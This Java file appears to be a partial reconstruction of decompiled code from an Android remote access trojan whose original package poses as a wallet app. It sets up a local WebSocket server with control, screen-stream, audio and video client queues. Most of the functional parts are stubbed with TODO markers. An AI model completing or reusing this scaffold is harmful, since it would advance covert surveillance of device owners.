package com.vendor.rat.control.server;

import android.util.Log;
import java.util.Iterator;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;

/**
 * 本地 WebSocket 服务端
 * vendor: com.guard.wallet.server.c (extends n1.b WebSocketServer)
 *
 * 字段:
 *   - DEFAULT_PORT = 7900
 *   - FALLBACK_PORT = 7980
 *   - instance (单例)
 *   - isRunning (AtomicBoolean)
 *   - controlClients (ConcurrentLinkedQueue)
 *   - streamClients (ConcurrentLinkedQueue)
 *   - audioClients (ConcurrentLinkedQueue)
 *   - videoClients (ConcurrentLinkedQueue)
 */
public final class LocalWebSocketServer {

    private static final String TAG = "LocalWebSocketServer";
    public static final Integer DEFAULT_PORT = 7900;
    public static final Integer FALLBACK_PORT = 7980;
    public static LocalWebSocketServer instance;

    public final AtomicBoolean isRunning;
    public final ConcurrentLinkedQueue controlClients;
    public final ConcurrentLinkedQueue streamClients;
    public final ConcurrentLinkedQueue audioClients;
    public final ConcurrentLinkedQueue videoClients;
    private final int port;

    public LocalWebSocketServer(Integer port) {
        this.port = port.intValue();
        this.isRunning = new AtomicBoolean(false);
        this.controlClients = new ConcurrentLinkedQueue();
        this.streamClients = new ConcurrentLinkedQueue();
        this.audioClients = new ConcurrentLinkedQueue();
        this.videoClients = new ConcurrentLinkedQueue();
    }

    /**
     * 获取单例 (端口可用性检测)
     * vendor: server.c.G()
     */
    public static LocalWebSocketServer getInstance() {
        if (instance == null) {
            // vendor: 检查 DEFAULT_PORT 是否可用, 否则用 FALLBACK_PORT
            // TODO: VENDOR_VERIFY - 需要端口检测工具方法
            instance = new LocalWebSocketServer(DEFAULT_PORT);
        }
        return instance;
    }

    /**
     * 启动 WebSocket 服务 (daemon 线程)
     * vendor: server.c.H()
     */
    public static void startServer() {
        LocalWebSocketServer server = getInstance();
        Log.d(TAG, "webSocketServer start on port " + server.port);
        // vendor: 设置 daemon=true, 启动新线程运行 server
        // TODO: VENDOR_VERIFY - 需要实际 WebSocket 服务端实现
    }

    /**
     * 客户端断开回调 - 从所有队列移除
     * vendor: server.c.B(WebSocket)
     */
    public final void onClientClose(Object client) {
        Log.d(TAG, "onClose");
        removeFromQueue(this.controlClients, client);
        removeFromQueue(this.streamClients, client);
        removeFromQueue(this.audioClients, client);
        removeFromQueue(this.videoClients, client);
    }

    /**
     * 服务启动失败回调 - 重置并重试
     * vendor: server.c.C(Exception)
     */
    public final void onError(Exception exc) {
        Log.e(TAG, "WebSocketServer 启动失败:" + exc);
        try {
            if (instance != null) {
                instance = null;
            }
            // vendor: sleep 5s → 重新启动
            // TODO: VENDOR_VERIFY - 重试逻辑
            startServer();
        } catch (Exception e) {
            Log.e(TAG, "Restart failed", e);
        }
    }

    /**
     * 向 stream 客户端广播消息
     * vendor: server.c.I(String)
     */
    public final void broadcastToStream(String message) {
        if (message == null || message.isEmpty()) {
            return;
        }
        ConcurrentLinkedQueue queue = this.streamClients;
        if (queue.isEmpty()) {
            return;
        }
        Iterator it = queue.iterator();
        while (it.hasNext()) {
            Object client = it.next();
            // vendor: client.send(message.getBytes(UTF_8))
            // TODO: VENDOR_VERIFY - WebSocket send
        }
    }

    @SuppressWarnings("unchecked")
    private void removeFromQueue(ConcurrentLinkedQueue queue, Object client) {
        if (!queue.isEmpty()) {
            queue.remove(client);
        }
    }
}
